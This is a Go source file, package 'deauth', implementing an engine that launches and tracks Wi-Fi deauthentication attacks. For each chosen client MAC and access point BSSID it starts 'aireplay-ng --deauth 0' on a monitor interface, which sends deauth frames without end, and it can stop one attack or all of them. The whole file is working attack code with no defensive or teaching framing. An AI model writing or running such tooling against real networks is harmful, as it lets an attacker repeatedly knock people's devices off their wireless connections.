package deauth

import ("fmt";"log";"os/exec";"sync")

type tgt struct { MAC, BSSID string; cmd *exec.Cmd; on bool }
type Engine struct { mu sync.RWMutex; tgts map[string]*tgt; iface string }

func New() *Engine { return &Engine{tgts: make(map[string]*tgt), iface: "wlan1mon"} }
func (e *Engine) GetActiveTargets() []string { e.mu.RLock(); defer e.mu.RUnlock(); var o []string; for m, t := range e.tgts { if t.on { o = append(o, m) } }; return o }
func (e *Engine) Start(mac, bssid string) error {
	e.mu.Lock(); defer e.mu.Unlock()
	if t, ok := e.tgts[mac]; ok && t.on { return fmt.Errorf("active") }
	log.Printf("[*] Deauth %s", mac)
	cmd := exec.Command("aireplay-ng", "--deauth", "0", "-a", bssid, "-c", mac, e.iface); cmd.Start()
	e.tgts[mac] = &tgt{mac, bssid, cmd, true}; return nil
}
func (e *Engine) Stop(mac string) error {
	e.mu.Lock(); defer e.mu.Unlock()
	t, ok := e.tgts[mac]; if !ok || !t.on { return fmt.Errorf("not active") }
	if t.cmd != nil { t.cmd.Process.Kill() }; t.on = false; return nil
}
func (e *Engine) StopAll() { e.mu.Lock(); defer e.mu.Unlock(); for _, t := range e.tgts { if t.on { if t.cmd != nil { t.cmd.Process.Kill() }; t.on = false } } }
